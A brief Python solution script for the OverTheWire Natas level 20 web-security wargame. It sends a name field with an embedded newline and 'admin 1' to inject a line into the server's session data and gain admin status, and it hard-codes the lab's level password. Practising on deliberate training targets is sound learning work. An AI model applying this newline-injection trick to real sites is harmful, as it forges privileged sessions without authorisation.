import requests

url="http://natas20.natas.labs.overthewire.org"
auth_user="natas20"
auth_pass="guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

update=dict(name="data\nadmin 1")

r1= requests.post(url,auth=(auth_user,auth_pass),data=update)
cookie=r1.cookies.get_dict()

r2= requests.post(url,auth=(auth_user,auth_pass),cookies=cookie)
print(r2.text)